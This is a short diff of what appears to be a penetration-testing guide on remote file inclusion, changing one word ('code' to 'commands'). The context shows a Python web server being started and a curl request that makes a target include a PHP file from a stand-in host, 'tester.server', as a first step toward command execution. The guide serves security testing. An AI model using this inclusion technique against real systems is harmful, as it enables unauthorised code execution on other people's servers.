@@ -60,7 +60,7 @@ python3 -m http.server 80
 curl '$URL/?parameter=http://tester.server/phpinfo.php'
 ```
 
-If the phpinfo has been successfully printed in the response, the tester can engage a more offensive approach by trying to execute code with one of the following payloads.
+If the phpinfo has been successfully printed in the response, the tester can engage a more offensive approach by trying to execute commands with one of the following payloads.
 
 {% hint style="info" %}
 As code execution functions can be filtered, the phpinfo testing phase is required to assert that arbitrary PHP code is included and interpreted.
